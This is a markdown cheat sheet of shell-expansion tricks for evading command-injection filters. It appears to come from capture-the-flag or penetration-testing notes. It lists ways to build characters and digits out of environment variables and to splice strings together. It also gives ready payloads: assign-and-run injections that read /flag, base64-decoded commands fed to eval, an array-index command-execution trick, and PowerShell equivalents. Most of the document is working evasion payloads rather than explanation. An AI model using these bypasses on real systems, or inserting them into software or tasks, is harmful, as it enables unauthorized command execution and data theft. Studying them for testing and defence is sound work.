# Variable & Expansion Tricks — building strings you can't type

## `${var}` expansion catalogue — the primitives

| Form | Meaning | Use |
|---|---|---|
| `$IFS` / `${IFS}` | internal field sep = space/tab/nl | whitespace |
| `${var:off:len}` | substring | extract chars from env vars |
| `${var/pat/rep}` | substitution | char replacement |
| `${var^^}` `${var,,}` | case fold | bash4+: upper/lower |
| `${var#pat}` `${var##pat}` | strip prefix | basename tricks |
| `${var%pat}` `${var%%pat}` | strip suffix | dirname tricks |
| `${var:-def}` | default if unset | splice empty/guaranteed vals |
| `${var:+alt}` | alt if set | conditional splice |
| `$@` `$*` | all positional params | empty splice inside words |
| `$0` | shell name/path | `/` via `${0:0:1}` if abs |
| `$$` `$!` `$?` `$#` `$-` | pid/job/status/count/flags | digits/chars |
| `$PWD` `$HOME` `$PATH` `$SHELL` `$OLDPWD` `$USER` `$HOSTNAME` `$LANG` `$PS1` | env vars | char source |

## Char-extraction cookbook — make any char from env

```sh
${PWD:0:1}      → '/'            (cwd is /something)
${HOME:0:1}     → '/'            (HOME=/root)
${SHELL:0:1}    → '/'
${PATH:0:1}     → '/'
${PATH:5:1}     → 'b' or '/' or whatever byte is at offset 5
${USER:0:1}     → 'r' (root) or 'w' (www)
${HOSTNAME:0:2} → first 2 chars of hostname
${0:0:1}        → '/' or '-' or 's' (login shells get '-')
${PS1:0:1}      → '\\' or '[' or '$'
${RANDOM:0:1}   → a random digit — unstable, avoid
$$              → pid — digits for numeric builds
${-}            → flags like 'himBHs' — 's' 'h' 'i' 'm' 'B' 'H' chars!
${?}            → '0' or '1'
```

Build `cat` without letters: hard — the vars rarely spell it. Better:
build the SEPARATOR chars (space/slash) and glob the name —
`wildcard-globbing.md`.

## The `$$`/digit path — numerics without typing digits

If digits are filtered:

```
$$              → pid (a number!)
$#              → arg count (0 usually)
${#PWD}         → length of $PWD — a digit
$((1+1))        → arithmetic makes digits
$((0x10))       → hex literals in arithmetic
```

## `$_` and `$-` — sneaky char sources

- `$_` = last arg of previous command — in `sh -c 'x'` it's often the
  command line itself — char source
- `$-` = shell option flags (`himBHs` typical) — `${-:0:1}`='h',
  `${-:2:1}`='m', etc — letters for building names!

`${-}` is gold: `himBHs` gives you h,i,m,B,H,s chars:

```
${-:0:1}    h
${-:1:1}    i
${-:2:1}    m
${-:4:1}    B or s
```

## `${var%pattern}` — trimming paths

```sh
${PWD%/*}       → parent dir
${PWD##*/}      → basename
${SHELL%/*}     → /bin or /usr/bin (dir part)
${PATH%%:*}     → first PATH entry
```

Build `/etc` as `${PATH%%:*}` if PATH starts `/etc`? — no, PATH starts
`/usr/...` typically. `${SHELL%/*}` gives `/bin` or `/usr/bin` reliably.

## Splicing into words — `$@`/`$*`/`${x}` empty-var insert

```
c$@at       → cat        ($@ is empty here)
c$*at
c${NONEXISTENT}at
c${x:-}at   — default-empty
${x:+c}at   — if x set → 'cat', else 'at'
```

`$@`/`$*` inside a word expand to positional params — empty outside
function args → a clean splice.

## `${!x}` indirect + `x=...` assignment-in-injection

If your injection lands mid-command you can still ASSIGN:

```
;x=cat;$x /flag        — assign then deref
;a=ca;a+=t;$a /flag    — bash +=
```

## Arithmetic — `$((...))` for digits and logic

```
$((7*7))              → 49 (detection oracle)
$((0x2f))             → 47 (hex literal)
$((2#101))            → 5 (binary)
$((x=5))              → assignment inside arithmetic
```

`$(( ))` evaluates — arithmetic can't exec commands directly BUT bash's
array-index-evals-expression does: `a[$((...))]` — and `a[$(cmd)]` —
the `$( )` inside `[ ]` runs! The classic RCE:

```
x=a[@];a[$(id)]
```

## `eval` re-expansion — decode then run

```
x='Y2F0';$(echo $x|base64 -d) /flag
eval "$(echo Y2F0fGZsYWc=|base64 -d)"
```

## Brace expansion as word-splitter — `{a,b}`

`{cat,/flag}` → two words — no IFS needed (bash/zsh only):

```
{ca${x}t,/flag}
{${c},${f}}  — if vars hold command/arg
```

## The `${var%?}` `${var#?}` char-strip ladder — shrinking strings

```
x=/etc/passwd
${x#?}    → etc/passwd   (strip first)
${x%?}    → /etc/passw   (strip last)
${x:1}    → etc/passwd   (substring from 1)
```

## Windows/PowerShell analogues

```powershell
$env:windir[0]           → 'C' char
"$( )"/subexpressions, ${x} vars, -join
[char]0x2f               → '/'
'iex' vs '&' call operator
$env:Path -split ';'
```

## Falsifiers

- `$`/`{`/`}` all stripped AND no other expansion mechanism — expansion
  tricks all dead; only argv-boundary flag injection may remain

## Output to record

- which env var produced which needed char + the working expansion form
